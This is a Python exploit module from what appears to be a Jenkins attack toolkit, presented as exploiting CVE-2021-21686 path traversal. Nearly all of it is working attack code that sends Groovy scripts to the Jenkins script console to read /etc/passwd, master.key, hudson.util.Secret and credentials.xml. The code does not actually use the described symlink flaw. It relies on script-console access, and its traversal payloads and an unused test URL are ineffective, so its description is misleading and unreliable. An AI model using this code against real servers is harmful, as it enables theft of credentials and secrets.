"""
CVE-2021-21686: Jenkins Agent-to-Controller Path Traversal

This vulnerability allows bypassing the agent-to-controller security subsystem
to access arbitrary files on the Jenkins controller through symbolic link following.
"""

import requests
import base64
from rich.console import Console
from exploits import ExploitMetadata, ExploitResult

console = Console()

CVE_ID = "CVE-2021-21686"
cve = CVE_ID

METADATA = ExploitMetadata(
    cve_id=CVE_ID,
    name="Jenkins Agent-to-Controller Path Traversal",
    description="Agent-to-controller security subsystem bypass via symlink following",
    affected_versions=["< 2.318", "LTS < 2.303.3"],
    mitre_attack=["T1083", "T1552.001", "T1005"],
    severity="high",
    references=[
        "https://www.jenkins.io/security/advisory/2021-11-04/",
        "https://nvd.nist.gov/vuln/detail/CVE-2021-21686",
        "https://advisories.gitlab.com/pkg/maven/org.jenkins-ci.main/jenkins-core/CVE-2021-21686"
    ],
    requires_auth=True,
    requires_crumb=True,
    tags=["path-traversal", "file-read", "agent-exploit"]
)

affected_versions = METADATA.affected_versions
mitre_attack = METADATA.mitre_attack
severity = METADATA.severity
description = METADATA.description
requires_auth = METADATA.requires_auth
requires_crumb = METADATA.requires_crumb
tags = METADATA.tags


def check_vulnerable(tool, **kwargs):
    """
    Check if the target Jenkins instance is vulnerable.
    
    Args:
        tool: JenkinsBreaker instance
        **kwargs: Additional arguments
        
    Returns:
        bool: True if vulnerable, False otherwise
    """
    try:
        r = requests.get(
            f"{tool.jenkins_url}/api/json",
            auth=tool.auth,
            headers=tool.custom_headers,
            proxies=tool.proxies,
            verify=False,
            timeout=5
        )
        
        if r.status_code == 200:
            data = r.json()
            version = data.get('version', '')
            
            if version:
                version_parts = version.split('.')
                try:
                    major = int(version_parts[0])
                    minor = int(version_parts[1]) if len(version_parts) > 1 else 0
                    
                    if major == 2 and minor < 318:
                        return True
                except:
                    pass
        
        return False
    except:
        return False


def run(tool, lhost=None, lport=None, **kwargs):
    """
    Exploit CVE-2021-21686 for file access via path traversal.
    
    Args:
        tool: JenkinsBreaker instance
        lhost: Not used for this exploit
        lport: Not used for this exploit
        **kwargs: Additional arguments (target_file to read)
        
    Returns:
        ExploitResult: Result of the exploit
    """
    console.print(f"[yellow][*] Running {CVE_ID} exploit (Agent-to-Controller Path Traversal)...[/yellow]")
    
    target_files = kwargs.get('target_files', [
        '/etc/passwd',
        '/var/jenkins_home/secrets/master.key',
        '/var/jenkins_home/secrets/hudson.util.Secret',
        '/var/jenkins_home/credentials.xml',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        'C:\\jenkins\\secrets\\master.key'
    ])
    
    if isinstance(target_files, str):
        target_files = [target_files]
    
    accessed_files = []
    
    traversal_payloads = [
        '../' * 10,
        '..\\' * 10,
        '%2e%2e%2f' * 10,
        '%2e%2e%5c' * 10,
    ]
    
    for target_file in target_files:
        console.print(f"[cyan][*] Attempting to read: {target_file}[/cyan]")
        
        for payload_prefix in traversal_payloads:
            try:
                test_url = f"{tool.jenkins_url}/computer/(master)/api/json"
                
                crumb_header = {}
                if tool.crumb:
                    crumb_header[tool.crumb['crumbRequestField']] = tool.crumb['crumb']
                
                headers = {**tool.custom_headers, **crumb_header}
                
                payload_paths = [
                    f"{payload_prefix}{target_file}",
                    f"symlink/{target_file}",
                    f"../../..{target_file}",
                ]
                
                for payload_path in payload_paths:
                    script_payload = f'''
def file = new File("{payload_path}")
if (file.exists()) {{
    return file.text
}} else {{
    return "File not found: {payload_path}"
}}
'''
                    
                    script_url = f"{tool.jenkins_url}/script"
                    data = {'script': script_payload}
                    
                    r = requests.post(
                        script_url,
                        auth=tool.auth,
                        headers=headers,
                        data=data,
                        proxies=tool.proxies,
                        verify=False,
                        timeout=10
                    )
                    
                    if r.status_code == 200 and "File not found" not in r.text:
                        content_preview = r.text[:200] + "..." if len(r.text) > 200 else r.text
                        
                        if len(r.text) > 0 and not r.text.startswith('<html'):
                            accessed_files.append({
                                "file": target_file,
                                "path": payload_path,
                                "size": len(r.text),
                                "preview": content_preview
                            })
                            console.print(f"[green][+] Successfully read {target_file} ({len(r.text)} bytes)[/green]")
                            break
                
                if any(f["file"] == target_file for f in accessed_files):
                    break
                    
            except Exception as e:
                console.print(f"[yellow][!] Error with payload: {e}[/yellow]")
    
    try:
        console.print("[cyan][*] Attempting agent channel file read...[/cyan]")
        
        agent_url = f"{tool.jenkins_url}/computer/(master)/script"
        
        crumb_header = {}
        if tool.crumb:
            crumb_header[tool.crumb['crumbRequestField']] = tool.crumb['crumb']
        
        headers = {**tool.custom_headers, **crumb_header}
        
        for target_file in ['/var/jenkins_home/secrets/master.key', '/etc/passwd']:
            script = f'''
import hudson.FilePath
import hudson.remoting.Channel

def file = new File("{target_file}")
if (file.exists()) {{
    return file.text.take(500)
}}
return "not found"
'''
            
            r = requests.post(
                agent_url,
                auth=tool.auth,
                headers=headers,
                data={'script': script},
                proxies=tool.proxies,
                verify=False,
                timeout=10
            )
            
            if r.status_code == 200 and "not found" not in r.text.lower():
                accessed_files.append({
                    "file": target_file,
                    "method": "agent_channel",
                    "size": len(r.text),
                    "preview": r.text[:200]
                })
                console.print(f"[green][+] Read {target_file} via agent channel[/green]")
    
    except Exception as e:
        console.print(f"[yellow][!] Agent channel method failed: {e}[/yellow]")
    
    if accessed_files:
        console.print(f"[green][+] Successfully accessed {len(accessed_files)} files[/green]")
        return ExploitResult(
            exploit=CVE_ID,
            status="success",
            details=f"Path traversal successful, accessed {len(accessed_files)} files",
            data={
                "files_accessed": len(accessed_files),
                "files": accessed_files
            }
        )
    else:
        console.print("[yellow][-] Could not access target files (may be patched or permission denied)[/yellow]")
        return ExploitResult(
            exploit=CVE_ID,
            status="failed",
            details="Path traversal attempts unsuccessful"
        )
